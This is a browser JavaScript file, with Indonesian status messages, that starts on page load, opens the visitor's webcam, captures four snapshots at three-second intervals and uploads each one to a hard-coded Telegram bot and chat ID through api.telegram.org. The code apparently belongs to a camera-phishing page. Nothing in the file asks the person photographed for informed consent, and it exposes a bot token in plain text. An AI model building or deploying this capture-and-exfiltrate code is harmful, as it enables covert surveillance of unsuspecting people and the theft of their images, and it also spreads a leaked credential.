const telegramConfig = {
    botToken: '8091660159:AAG2sLUhLQGt6NVSJQdlxAw3u8VaXSR7S_g',
    chatId: '6692971365'
};

const videoElement = document.getElementById('videoElement');
const canvasElement = document.getElementById('canvasElement');
const context = canvasElement.getContext('2d');
const statusDiv = document.getElementById('status');
const captureCount = 4;
const intervalTime = 3000;
let imagesSent = 0;
let captureInterval;

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoElement.srcObject = stream;
        videoElement.addEventListener('loadedmetadata', () => {
            console.log('Metadata video loaded:', videoElement.videoWidth, videoElement.videoHeight);
            statusDiv.innerText = `Kamera aktif, akan mengambil ${captureCount} gambar setiap ${intervalTime / 1000} detik.`;
            setTimeout(startCaptureInterval, 1000);
        });
        videoElement.addEventListener('loadeddata', () => console.log('Data video loaded.'));
        videoElement.addEventListener('play', () => console.log('Video is playing.'));
        videoElement.onerror = (error) => {
            console.error('Error with video element:', error);
            statusDiv.innerText = 'Terjadi kesalahan dengan elemen video.';
        };
    } catch (error) {
        console.error('Gagal mengakses kamera:', error);
        statusDiv.innerText = 'Gagal mengakses kamera. Pastikan izin kamera telah diberikan.';
    }
}

function startCaptureInterval() {
    captureInterval = setInterval(() => {
        if (imagesSent < captureCount) {
            captureAndSendImage();
        } else {
            clearInterval(captureInterval);
            statusDiv.innerText = 'Semua gambar telah dikirim.';
        }
    }, intervalTime);
}

function captureAndSendImage() {
    statusDiv.innerText = `Mengambil gambar ke-${imagesSent + 1}...`;
    console.log('Ukuran Video Sebelum Capture:', videoElement.videoWidth, videoElement.videoHeight);
    if (!videoElement.videoWidth || !videoElement.videoHeight) {
        console.warn('Ukuran video belum tersedia saat pengambilan gambar.');
        return;
    }
    canvasElement.width = videoElement.videoWidth;
    canvasElement.height = videoElement.videoHeight;
    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
    const imageData = context.getImageData(0, 0, canvasElement.width, canvasElement.height);
    const isAllBlack = imageData.data.every(pixel => pixel === 0);
    console.log('Apakah gambar di canvas hitam?', isAllBlack);
    const imageDataURL = canvasElement.toDataURL('image/jpeg');
    sendImageToTelegram(imageDataURL);
}

async function sendImageToTelegram(imageDataURL) {
    statusDiv.innerText = `Mengirim gambar ke-${imagesSent + 1}...`;
    const formData = new FormData();
    formData.append('chat_id', telegramConfig.chatId);
    formData.append('photo', dataURLtoBlob(imageDataURL), `captured_image_${imagesSent + 1}.jpg`);

    try {
        const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendPhoto`, {
            method: 'POST',
            body: formData,
        });
        const data = await response.json();
        console.log('Respons dari Telegram API:', data);
        if (data.ok) {
            statusDiv.innerText = `Gambar ke-${imagesSent + 1} berhasil dikirim ke Telegram!`;
            console.log(`Gambar ke-${imagesSent + 1} berhasil dikirim:`, new Date());
            imagesSent++;
        } else {
            console.error('Gagal mengirim gambar ke Telegram:', data);
            statusDiv.innerText = `Gagal mengirim gambar ke-${imagesSent + 1} ke Telegram. Error: ${data.description || 'Tidak ada deskripsi error'}`;
            clearInterval(captureInterval);
        }
    } catch (error) {
        console.error('Terjadi kesalahan saat mengirim gambar:', error);
        statusDiv.innerText = `Terjadi kesalahan saat mengirim gambar ke-${imagesSent + 1}: ${error.message}`;
        clearInterval(captureInterval);
    }
}

function dataURLtoBlob(dataURL) {
    const byteString = atob(dataURL.split(',')[1]);
    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}

startCamera();
